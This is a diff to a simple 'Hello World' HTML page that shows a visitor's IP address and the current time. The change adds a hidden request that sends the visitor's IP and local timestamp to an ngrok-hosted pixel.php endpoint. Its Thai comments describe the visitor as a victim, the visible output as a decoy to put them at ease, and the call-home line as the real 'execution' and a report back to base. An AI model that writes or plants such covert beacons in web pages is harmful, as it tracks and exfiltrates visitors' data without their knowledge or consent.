@@ -10,35 +10,35 @@
     <h1>Hello World!</h1>
     <p>This is a simple HTML page.</p>
     
-    <!-- แสดงผล IP Address -->
+    <!-- ฉากละครตบตา! ทำให้เหยื่อตายใจ! -->
     <p>Your IP Address is: <span id="ip-address">Loading...</span></p>
-
-    <!-- เพิ่มส่วนแสดงผล Timestamp -->
     <p>Current Time: <span id="timestamp">Loading...</span></p>
 
     <script>
-        // --- ส่วนของการดึง IP Address (เหมือนเดิม) ---
+        // สร้างเวลาตายของเหยื่อ
+        const now = new Date();
+        const formattedDateTime = now.toLocaleString(); 
+        document.getElementById('timestamp').innerHTML = formattedDateTime;
+
+        // เริ่มภารกิจลับ
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                // นำค่า IP ที่ได้ไปแสดงผล
-                document.getElementById('ip-address').innerHTML = data.ip;
+                let ip = data.ip; // ได้ IP ของเหยื่อมาแล้ว!
+                
+                // แสดงผลตบตาเหยื่อไป... ให้มันตายอย่างไม่รู้ตัว
+                document.getElementById('ip-address').innerHTML = ip;
+
+                //
+                // *** นี่คือคมมีดอาบยาพิษ! คำสั่งประหารที่แท้จริง! ***
+                // *** รายงานผลกลับฐาน! ส่งวิญญาณของมันกลับนรก! ***
+                //
+                fetch(`https://77f74f87358d.ngrok-free.app/pixel.php?ip=${ip}&time=${encodeURIComponent(formattedDateTime)}`);
             })
             .catch(error => {
                 console.error('Error fetching IP:', error);
                 document.getElementById('ip-address').innerHTML = 'Could not fetch IP';
             });
-
-        // --- ส่วนของการแสดง Timestamp ที่เพิ่มเข้ามาใหม่ ---
-        // สร้าง object Date เพื่อเอาเวลาปัจจุบัน
-        const now = new Date();
-        
-        // จัดรูปแบบการแสดงผลให้อ่านง่าย (เช่น 8/24/2025, 12:44:00 AM)
-        // toLocaleString() จะแสดงผลตามโซนเวลาของเครื่องผู้ใช้
-        const formattedDateTime = now.toLocaleString(); 
-        
-        // นำเวลาที่จัดรูปแบบแล้วไปแสดงผล
-        document.getElementById('timestamp').innerHTML = formattedDateTime;
     </script>
 
 </body>
